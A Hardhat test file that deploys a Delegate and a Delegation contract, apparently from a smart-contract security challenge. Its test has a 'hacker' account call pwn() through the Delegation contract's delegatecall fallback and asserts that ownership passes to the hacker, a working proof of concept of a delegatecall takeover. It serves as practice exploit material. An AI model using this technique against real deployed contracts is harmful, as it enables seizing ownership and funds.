import { use, expect } from 'chai';
import { ethers, waffle } from 'hardhat';
import { Delegate, Delegation } from '../dist/types';

use(waffle.solidity);

describe('Simple', () => {
  let deployer: any, hacker: any;
  let d1: Delegate;
  let d2: Delegation;

  before(async () => {
    [deployer, hacker] = await ethers.getSigners();

    d1 = await (await ethers.getContractFactory('Delegate'))
      .deploy(deployer.address) as Delegate;
    await d1.deployed();

    d2 = await (await ethers.getContractFactory('Delegation'))
      .deploy(d1.address) as Delegation;
    await d2.deployed();
  });

  it('interaction', async () => {
    [deployer, hacker] = await ethers.getSigners();

    // before
    expect(await d2.owner()).to.eq(deployer.address);

    // hack
    await d1.attach(d2.address).connect(hacker).pwn();
    expect(await d2.owner()).to.eq(hacker.address);
  });
});
